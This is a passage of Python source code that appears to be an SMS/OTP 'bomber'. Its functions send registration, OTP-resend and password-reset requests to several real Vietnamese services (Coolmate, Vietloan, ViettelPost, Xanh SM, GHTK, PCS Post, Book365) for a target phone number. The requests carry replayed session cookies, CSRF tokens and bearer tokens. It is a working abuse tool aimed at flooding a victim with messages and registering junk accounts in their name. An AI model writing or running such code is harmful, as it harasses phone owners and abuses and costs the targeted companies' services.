laravel_session=eyJpdiI6IkxYT0loN2tLSEpVeXRDVlZ2QVVpaUE9PSIsInZhbHVlIjoiMXZ0ZmtMbW5idVRGeUtoWmpJb3BMblVkK1dzM0VHK1N4aVlCQ0EzbUxRYko3TnlLUENCYkNQY2d2TkVzRDRRZCIsIm1hYyI6IjZjZGE3OWEyZmFjNDdjYzdiM2JiMWViZjNkMmRjMjA5YjUwZGMzNTA4NjZkNjcxMDA2OGEyNjBmODVjMTc3NTMifQ%3D%3D; redirect_url=eyJpdiI6IkwxQmpzTjFLWFJkakpZczZvc2dobkE9PSIsInZhbHVlIjoiUWFjVWt0YlZzWE5yM1BBb2hBSHd2TDAwaVwvNVVEczcwc3dBRFdQdUJIUEljcjMyUXlEUEZMOWJRVTRJVlh3MHZjVTJoTkN1MzFSemhEcDUwSWtqNUozSk1yOE0wUjJNWVVmbzROOTFvaExIN2R3V2VWVzVyK3l2d004c2lBMG0rdVwvWWk0cFwvNkc1VlFOd05cLzRDUXZ3VkhmN2ZjRjFENGJqSHQ2ZDZuSnRnVUJMakpTV2xkcUFUZWVpV2IxUEhZcVhGbk1MQzFFK3k2RGhDR2tIMysrRDVVUmxnaVFnKzl2a2VLUU9kWmo4NEl4UFBoSUFNcDZYU05Vb1NuRFhmUkpxcEtDTEFBcWxxUFJYQ2RuMWNcL08xNk1hNFNLT2pXTHpFaytvcnFsakdqOD0iLCJtYWMiOiJhODgzNDY3NmRkZWJlYmM1MjYwNjQxZTA4ODY2Nzg1YWQ4ODc0MjIwZDdkMmIyMjUwMzliODA0ZDA5YTlkZGMxIn0%3D',
        'origin': 'https://www.coolmate.me',
        'priority': 'u=1, i',
        'referer': 'https://www.coolmate.me/collection/combo-set-do-gia-tot?itm_source=homepage&itm_medium=herobanner_1&itm_campaign=Sale_giua_thang_15_8_-_Destop_-_fix_3&itm_content=/image/August2024/Sale_giua_thang_15_8_-_Destop_-_fix_3.jpg',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-csrf-token': 'rIG6136gGu756xPVgVVrXfLhxZUjZjmatPQ1iU7u',
    }

    json_data = {
        'phone': sdt,
        'type': 'register',
    }

    try:
        response = requests.post('https://www.coolmate.me/otp/renew', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("COOLMATERESEND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("COOLMATERESEND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vietloan():
    cookies = {
        'jslbrc': 'w.20240725025025a4a6e770-4a30-11ef-b50d-96d7934ebbe4.A_GS',
        '__cfruid': '94bcfce67157e886a01124469394f2d98678e632-1722410833',
        '_gcl_au': '1.1.1637479389.1722410837',
        '_gid': 'GA1.2.249547405.1722410837',
        '_tt_enable_cookie': '1',
        '_ttp': 'BCNl-9LA0i0a8YqJWV2Veir4WGy',
        '_clck': '8x261n%7C2%7Cfnx%7C0%7C1673',
        'mousestats_vi': 'e6c32520217f71487615',
        'mousestats_si': '3e2a87f99adf896bce1e',
        '_ym_uid': '1722410839843139251',
        '_ym_d': '1722410839',
        '_ym_isad': '2',
        '_ym_visorc': 'w',
        'XSRF-TOKEN': 'eyJpdiI6Ilh0eGx0WFkzempHcUl0SGwxTVBYNUE9PSIsInZhbHVlIjoiR1FMc2R4MFlDRk9nN0FJY1UvckorTitKdmtZRE5MbG9tRDEvTVQ2dWlyOTYzZVVpM3RUUHVMYWhQaGNFd0dwRnRMMVpWNTR3MEdXcFJ1OXJ1N1RUUGM3bXdDNFhLdFh5WktybG9tblZqdnpGWTVpMEs1cStnS045bnR6ZmwrOTgiLCJtYWMiOiI2N2M0OTk2MGU5MTA4ZGJjZGZjNDZhY2MzNWQzOTRhMzU3NDc4OGM3NDQ3NTc4YWRlYzNhOTNlODVmODA2MDEzIiwidGFnIjoiIn0%3D',
        'sessionid': 'eyJpdiI6IkJRNHFWelAwVHdwWlprTElOWE1xMXc9PSIsInZhbHVlIjoiNXhvbUNuRFdFQThVRTY5eHNBREJwSExYVkxEa0VTZU94VEJRK0tsck1qQ0FydFdzaFRkMEZ5b1pQV25mOEFtR3p5aUZpMGVDYitPaUh3ejZ5dFh0VkRoMTRXdFV1aXhsd21TdWw4UGljQitJWmJiRDVTWXRiOStzZUt1SENqaG8iLCJtYWMiOiI3ZDE4MTY3MmRhMmIzN2YxNDNlMjg0MjFlZDAyZmNiMWJhZGJmOWI1MDY5ZDc2OGYzZjMxNmJiNzVlODY2NDI5IiwidGFnIjoiIn0%3D',
        'utm_uid': 'eyJpdiI6IktKMjNTNnRqdmx6MEUzV1czcEt6SVE9PSIsInZhbHVlIjoidE9LQ08wbXVldUd4VzMxc1R2V2RTKzJmM25lUXgzYXpXRXFGN3I1OG4xeEJMc212cnlCRXYrNEo3ZnU3QWxUSTJsY0FsUE5mZmtCT3BneFdIU25lb0E3N1djZzJKNlZpUmdZSkNHclZTMGZvMEZaUUNrby9EWHVoa3EyZDBNRzAiLCJtYWMiOiJiNTRlZGVhMTEyMDRlMjI2M2ZjM2ZmYmM2NDMzYjQ2NjI1MzMxOTY1ODE2N2M5N2EyNjI1NWM3ZDUxZTg5OTk4IiwidGFnIjoiIn0%3D',
        '_ga': 'GA1.2.1436947795.1722410837',
        '_ga_EBK41LH7H5': 'GS1.1.1722410836.1.1.1722410860.36.0.0',
        'ec_png_utm': '632e6101-b428-93c3-3898-ca177175bb79',
        'ec_png_client': 'false',
        'ec_png_client_utm': 'null',
        'ec_cache_utm': '632e6101-b428-93c3-3898-ca177175bb79',
        'ec_cache_client': 'false',
        'ec_cache_client_utm': 'null',
        'ec_etag_utm': '632e6101-b428-93c3-3898-ca177175bb79',
        'ec_etag_client': 'false',
        'ec_etag_client_utm': 'null',
        '_clsk': '9762wf%7C1722410862712%7C1%7C1%7Cr.clarity.ms%2Fcollect',
        'uid': '632e6101-b428-93c3-3898-ca177175bb79',
        'client': 'false',
        'client_utm': 'null',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'jslbrc=w.20240725025025a4a6e770-4a30-11ef-b50d-96d7934ebbe4.A_GS; __cfruid=94bcfce67157e886a01124469394f2d98678e632-1722410833; _gcl_au=1.1.1637479389.1722410837; _gid=GA1.2.249547405.1722410837; _tt_enable_cookie=1; _ttp=BCNl-9LA0i0a8YqJWV2Veir4WGy; _clck=8x261n%7C2%7Cfnx%7C0%7C1673; mousestats_vi=e6c32520217f71487615; mousestats_si=3e2a87f99adf896bce1e; _ym_uid=1722410839843139251; _ym_d=1722410839; _ym_isad=2; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6Ilh0eGx0WFkzempHcUl0SGwxTVBYNUE9PSIsInZhbHVlIjoiR1FMc2R4MFlDRk9nN0FJY1UvckorTitKdmtZRE5MbG9tRDEvTVQ2dWlyOTYzZVVpM3RUUHVMYWhQaGNFd0dwRnRMMVpWNTR3MEdXcFJ1OXJ1N1RUUGM3bXdDNFhLdFh5WktybG9tblZqdnpGWTVpMEs1cStnS045bnR6ZmwrOTgiLCJtYWMiOiI2N2M0OTk2MGU5MTA4ZGJjZGZjNDZhY2MzNWQzOTRhMzU3NDc4OGM3NDQ3NTc4YWRlYzNhOTNlODVmODA2MDEzIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6IkJRNHFWelAwVHdwWlprTElOWE1xMXc9PSIsInZhbHVlIjoiNXhvbUNuRFdFQThVRTY5eHNBREJwSExYVkxEa0VTZU94VEJRK0tsck1qQ0FydFdzaFRkMEZ5b1pQV25mOEFtR3p5aUZpMGVDYitPaUh3ejZ5dFh0VkRoMTRXdFV1aXhsd21TdWw4UGljQitJWmJiRDVTWXRiOStzZUt1SENqaG8iLCJtYWMiOiI3ZDE4MTY3MmRhMmIzN2YxNDNlMjg0MjFlZDAyZmNiMWJhZGJmOWI1MDY5ZDc2OGYzZjMxNmJiNzVlODY2NDI5IiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IktKMjNTNnRqdmx6MEUzV1czcEt6SVE9PSIsInZhbHVlIjoidE9LQ08wbXVldUd4VzMxc1R2V2RTKzJmM25lUXgzYXpXRXFGN3I1OG4xeEJMc212cnlCRXYrNEo3ZnU3QWxUSTJsY0FsUE5mZmtCT3BneFdIU25lb0E3N1djZzJKNlZpUmdZSkNHclZTMGZvMEZaUUNrby9EWHVoa3EyZDBNRzAiLCJtYWMiOiJiNTRlZGVhMTEyMDRlMjI2M2ZjM2ZmYmM2NDMzYjQ2NjI1MzMxOTY1ODE2N2M5N2EyNjI1NWM3ZDUxZTg5OTk4IiwidGFnIjoiIn0%3D; _ga=GA1.2.1436947795.1722410837; _ga_EBK41LH7H5=GS1.1.1722410836.1.1.1722410860.36.0.0; ec_png_utm=632e6101-b428-93c3-3898-ca177175bb79; ec_png_client=false; ec_png_client_utm=null; ec_cache_utm=632e6101-b428-93c3-3898-ca177175bb79; ec_cache_client=false; ec_cache_client_utm=null; ec_etag_utm=632e6101-b428-93c3-3898-ca177175bb79; ec_etag_client=false; ec_etag_client_utm=null; _clsk=9762wf%7C1722410862712%7C1%7C1%7Cr.clarity.ms%2Fcollect; uid=632e6101-b428-93c3-3898-ca177175bb79; client=false; client_utm=null',
        'origin': 'https://vietloan.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietloan.vn/register',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        '_token': 'Fh2qJ1nzCevC64qwn8dWINt1Nw0ykTSrpDEABcBU',
    }

    try:
        response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIETLOAN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIETLOAN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def viettelpost():
    cookies = {
        'QUIZIZZ_WS_COOKIE': 'id_192.168.12.141_15001',
        '.AspNetCore.Antiforgery.XvyenbqPRmk': 'CfDJ8ASZJlA33dJMoWx8wnezdv-ldmCeCauiRwoNjbMuIi_12RwO7MX0bWiH1o0iU8D3b4WYfRUPQnjqeIiIpn3XmYRFi_KAJ99Y0oUQzmpZyla6brgkixhji6p2GHBun7BmyV5E_Ktge00TOT2nKbyulVM',
        '_gid': 'GA1.2.766667119.1722475009',
        '_ga_P86KBF64TN': 'GS1.1.1722475009.1.1.1722475193.0.0.0',
        '_ga_7RZCEBC0S6': 'GS1.1.1722475008.1.1.1722475193.0.0.0',
        '_ga': 'GA1.1.283730043.1722475009',
        '_ga_WN26X24M50': 'GS1.1.1722475008.1.1.1722475193.0.0.0',
    }

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'QUIZIZZ_WS_COOKIE=id_192.168.12.141_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8ASZJlA33dJMoWx8wnezdv-ldmCeCauiRwoNjbMuIi_12RwO7MX0bWiH1o0iU8D3b4WYfRUPQnjqeIiIpn3XmYRFi_KAJ99Y0oUQzmpZyla6brgkixhji6p2GHBun7BmyV5E_Ktge00TOT2nKbyulVM; _gid=GA1.2.766667119.1722475009; _ga_P86KBF64TN=GS1.1.1722475009.1.1.1722475193.0.0.0; _ga_7RZCEBC0S6=GS1.1.1722475008.1.1.1722475193.0.0.0; _ga=GA1.1.283730043.1722475009; _ga_WN26X24M50=GS1.1.1722475008.1.1.1722475193.0.0.0',
        'Origin': 'null',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'FormVerifyOtpModel.Phone': '',
        'FormVerifyOtpModel.Email': '',
        'FormVerifyOtpModel.Password': '',
        'FormVerifyOtpModel.UserId': '',
        'FormForgotPassword.Email': '',
        'FormForgotPassword.UserId': '',
        'FormForgotPassword.OtpRequestToken': 'hQJjQ5MHm/+Xhhl4WE/bgqiz4zCSvnT05qKj6TdLzs8KoYZsamRBy8gm8QhpxICqva9jHMo6V25AHvcBwxd1XKKwAEtKLyQEf4MzKeDh0xcoyQ1uuOGDCU3BIZUVmpbS2xVvglOZJs4srUSPHb+JLY+l+plhFg3xKvRJBLWpX0SSiip2/oxddKFM4tXwC0QGY8JYhI6UUF/8lwVKqM12H+cd4/DB3SEwaXkix8HEy+RpAnPCNw7N1ZjmTGxwP6cHz8lr6sEIg+mMXiOB/neVMK8xib3SiJf5p7RyzPf7J+CYANyeiU9YGQ0TZJFfSRHm9IEyW6PmxB4+4nh9h5CGU6/7EAw4924l',
        'FormRegister.FullName': 'quoc tien huy',
        'FormRegister.UserName': '',
        'FormRegister.Email': '',
        'FormRegister.Phone': sdt,
        'FormRegister.ConfirmPhone': 'False',
        'FormRegister.ConfirmEmail': 'False',
        'FormRegister.RequiredPhone': 'False',
        'FormRegister.RequiredEmail': 'False',
        'FormRegister.Provider': '',
        'FormRegister.ProviderUserId': '',
        'FormRegister.Password': '123123aA',
        'FormRegister.ConfirmPassword': '123123aA',
        'FormRegister.IsRegisterFromPhone': 'True',
        'FormRegister.UserId': '',
        'FormMergeModel.JsonListEmailConflict': '',
        'FormMergeModel.JsonListPhoneConflict': '',
        'FormMergeModel.EmailSelected': '',
        'FormMergeModel.PhoneSelected': '',
        'FormMergeModel.PhoneVerify': '',
        'FormMergeModel.EmailVerify': '',
        'FormMergeModel.IsRequiredSelect': 'False',
        'FormMergeModel.Password': '',
        'FormMergeModel.Provider': '',
        'FormMergeModel.ProviderUserId': '',
        'FormMergeModel.IsEmailVerified': 'False',
        'FormMergeModel.IsPhoneVerified': 'False',
        'FormNotMergeModel.Password': '',
        'FormNotMergeModel.Provider': '',
        'FormNotMergeModel.ProviderUserId': '',
        'FormNotMergeModel.UserSSOId': '',
        'FormNotMergeModel.EmailSelected': '',
        'FormNotMergeModel.PhoneSelected': '',
        'FormNotMergeModel.NotMergePhoneVerify': '',
        'FormNotMergeModel.NotMergeEmailVerify': '',
        'FormNotMergeModel.IsEmailVerified': 'False',
        'FormNotMergeModel.IsPhoneVerified': 'False',
        'FormLoginOTP.Username': '',
        'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=2fm315xzemzryzwbsz8jfj',
        'ConfirmOtpType': 'Register',
        'UserClientId': '',
        'ClientId': '',
        'OTPCode1': '',
        'OTPCode2': '',
        'OTPCode3': '',
        'OTPCode4': '',
        'OTPCode5': '',
        'OTPCode6': '',
        '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv-9JDAZiojDWGeKRvEUJqdyE128lDNBqZyxK9-1bDuTNAgW17qbK9uBU6V-VwQFZywRBM06-A6m7VU2ACjP9_OVf1RWEqp2aTwboyIFSzmLAXCbIuwwASKM6jHPCb2IAJ0',
    }

    try:
        response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIETTELPOST | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIETTELPOST | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def xanhsmreg():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://dangky.xanhsm.com',
        'priority': 'u=1, i',
        'referer': 'https://dangky.xanhsm.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'Data': {
            'YearExperience': 'GT_5_YEAR',
            'AppPartners': [
                'Gojek',
            ],
            'OnlineTime': 'FROM_4H_TO_8H_DAY',
            'DesiredIncome': 'FROM_10M_TO_20M',
            'BirthPlace': 'An Giang',
        },
        'City': 'hanoi',
        'Tel': sdt,
        'Name': 'VAN A DAT',
        'Source': '',
        'Online': False,
    }

    try:
        response = requests.post('https://gapi.xanhsm.com/bike/registering/create-registration', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("XANHSMREG | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("XANHSMREG | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def xanhsm():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://dangky.xanhsm.com',
        'priority': 'u=1, i',
        'referer': 'https://dangky.xanhsm.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'Tel': sdt,
    }

    try:
        response = requests.post('https://gapi.xanhsm.com/bike/registering/resend-otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("XANHSM | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("XANHSM | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def acheckin():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'access-control-allow-origin': '*',
        'authorization': 'undefined',
        'content-type': 'application/json',
        'locale': 'vi-VN',
        'origin': 'https://hrm.acheckin.io',
        'priority': 'u=1, i',
        'referer': 'https://hrm.acheckin.io/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-workspace-host': 'hrm.acheckin.io',
    }

    params = {
        'search': sdt_chuyen_doi,
    }

    try:
        response = requests.get(
            'https://api-gateway.acheckin.io/v1/external/auth/check-existed-account',
            params=params,
            headers=headers,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("ACHECKIN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("ACHECKIN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ghtkreg():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'apptype': 'Web',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MzM1MDIzNSwidGVsIjoiMDM1NzE1NjMyMiIsImVtYWlsIjoiNjZiMzNmYTRmMjNjNEBnaHRrLmlvIiwiYWNjZXNzX3Rva2VuIjpudWxsLCJqd3QiOm51bGwsImludmFsaWRfYXQiOnsiZGF0ZSI6IjIwMjQtMDgtMTQgMTY6MzQ6MjguOTk1NjkwIiwidGltZXpvbmVfdHlwZSI6MywidGltZXpvbmUiOiJBc2lhXC9Ib19DaGlfTWluaCJ9fQ.nr08Xjl1uhmrMZAaDu3BBO5PPhyBnroiTD9SOrw1hgc',
        'content-type': 'application/json',
        'origin': 'https://khachhang.giaohangtietkiem.vn',
        'priority': 'u=1, i',
        'referer': 'https://khachhang.giaohangtietkiem.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'shop-code': '',
        'uniqdevice': '0b59bf2e-65f0-489a-9ecd-9619d146001f',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'name': 'GTC Shop',
        'tel': sdt,
        'password': '123123aA@',
        'confirm_password': '123123aA@',
        'first_address': '12 BC TIn',
        'province': 'An Giang',
        'province_id': '833',
        'district': 'Huyện Châu Phú',
        'district_id': '1470',
        'ward': 'Xã Bình Long',
        'ward_id': '16579',
        'hamlet': 'Ấp Bình Chiến',
        'hamlet_id': '114065',
    }

    try:
        response = requests.post(
            'https://web.giaohangtietkiem.vn/api/v1/register-shop/create-register-shop',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GHTKREG | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GHTKREG | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ghtk():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'apptype': 'Web',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MzM1MDIzNywidGVsIjoiMDM1NzE1NjMyMSIsImVtYWlsIjoiNjZiMzNmYzVjOGI2MkBnaHRrLmlvIiwiYWNjZXNzX3Rva2VuIjpudWxsLCJqd3QiOm51bGwsImludmFsaWRfYXQiOnsiZGF0ZSI6IjIwMjQtMDgtMTQgMTY6MzU6MDEuODI2MDUwIiwidGltZXpvbmVfdHlwZSI6MywidGltZXpvbmUiOiJBc2lhXC9Ib19DaGlfTWluaCJ9fQ.th7fjWe_Z1_Aag1RQlDwQ_Q82k1cUkVrghVeJWIHqGI',
        'content-type': 'application/json',
        'origin': 'https://khachhang.giaohangtietkiem.vn',
        'priority': 'u=1, i',
        'referer': 'https://khachhang.giaohangtietkiem.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'shop-code': '',
        'uniqdevice': '0b59bf2e-65f0-489a-9ecd-9619d146001f',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'username': sdt,
        'card_images': [
            {
                'url': 'https://cache.giaohangtietkiem.vn/d/e569e3e6683d23d7de857156622c3703.png',
                'image_order': 1,
            },
            {
                'url': 'https://cache.giaohangtietkiem.vn/d/e8bd8e58171021dcb1bcac57487acf2e.png',
                'image_order': 2,
            },
        ],
    }

    try:
        response = requests.post('https://web.giaohangtietkiem.vn/api/v1/shop/password/send-otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GHTK | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GHTK | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pcspostreg():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://account.pcspost.vn',
        'priority': 'u=1, i',
        'referer': 'https://account.pcspost.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'StationCode': '89304',
        'confirmPassword': '123123aA@',
        'NewPassword': '123123aA@',
        'FullName': 'quoc tien huy',
        'EmailOrPhoneNr': sdt,
        'Password': '123123aA@',
    }

    try:
        response = requests.post('https://id.pcs.vn/api/account/mobile-register/POST', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PCSPOSTREG | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PCSPOSTREG | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pcspost():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'origin': 'https://account.pcspost.vn',
        'priority': 'u=1, i',
        'referer': 'https://account.pcspost.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'EmailOrPhone': sdt,
    }

    try:
        response = requests.get('https://id.pcs.vn/api/account/reset-password', params=params, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PCSPOST | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PCSPOST | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def book365reg():
    cookies = {
        'PHPSESSID': 'q1eX1jj6BFW225hxQlEVj0AvlsN2Qvzm',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=q1eX1jj6BFW225hxQlEVj0AvlsN2Qvzm',
        'origin': 'https://book365.vn',
        'priority': 'u=1, i',
        'referer': 'https://book365.vn/nha-phat-hanh/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'dangky_name': 'quoc dat',
        'dangky_phone': sdt,
        'dangky_pwd': '123123aA',
        'dangky_pwdCheck': '123123aA',
        'dangky_country': '0',
        'dangky_province': '0',
        'dangky_district': '0',
        'dangky_award': '0',
        'dangky_address': '',
        'dangky_email': '',
    }

    try:
        response = requests.post('https://book365.vn/ajax/dangky_taikhoan.php', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
